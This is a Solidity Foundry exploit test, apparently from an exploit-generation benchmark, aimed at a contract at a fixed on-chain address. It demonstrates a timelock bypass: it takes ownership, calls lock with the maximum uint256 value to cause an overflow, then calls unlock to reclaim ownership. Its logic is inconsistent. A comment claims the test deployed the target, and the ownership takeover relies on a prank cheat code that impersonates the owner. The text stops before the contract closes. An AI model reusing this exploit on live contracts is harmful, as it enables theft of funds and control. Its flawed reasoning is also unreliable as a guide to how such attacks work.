contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address originalOwner;
    // The target contract is instantiated using its address and the newly defined interface.
    ITarget constant TARGET = ITarget(0xf7958ffc6cE46dE09e0AB69B7dA360C38b16266B);
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // The attacker is the owner by default as the test contract deploys the target contract.
        // No special setup is required.
        originalOwner = TARGET.owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Phase 1: Gain Ownership
                // The attacker must be the owner to call lock. We impersonate the original owner to gain ownership.
                vm.startPrank(originalOwner);
                TARGET.transferOwnership(attacker);
                vm.stopPrank();

                // Verify attacker is now the owner
                assertEq(TARGET.owner(), attacker);

                // Phase 2: Execute Timelock Bypass
                // 1. As the new owner, call lock() with a value that causes an integer overflow.
                // This sets _previousOwner to the attacker's address.
                TARGET.lock(type(uint256).max);

                // Verify ownership is renounced temporarily
                assertEq(TARGET.owner(), address(0));

                // 2. Immediately call unlock(). Since _previousOwner is the attacker, this succeeds.
                TARGET.unlock();

                // Final oracle check will assert this is true
                assertEq(TARGET.owner(), attacker);
    }




